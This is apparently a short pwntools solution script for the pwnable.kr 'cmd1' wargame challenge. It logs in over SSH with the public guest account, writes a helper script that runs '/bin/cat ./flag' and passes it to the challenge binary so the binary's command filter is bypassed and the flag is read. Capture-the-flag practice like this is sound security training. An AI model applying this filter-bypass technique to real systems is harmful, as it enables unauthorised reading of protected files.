from pwn import * 



s = ssh(user="cmd1",host="pwnable.kr",port=2222,password="guest")
sh = s.shell("nc 0 10012")


sh.sendline(b"echo '/bin/cat ./flag' > run")
sh.sendline(b"chmod +x run")
sh.recv()


sh.sendline(b"./cmd1 ./run")
print(sh.recv(timeout=1).decode())


sh.close()
s.close()
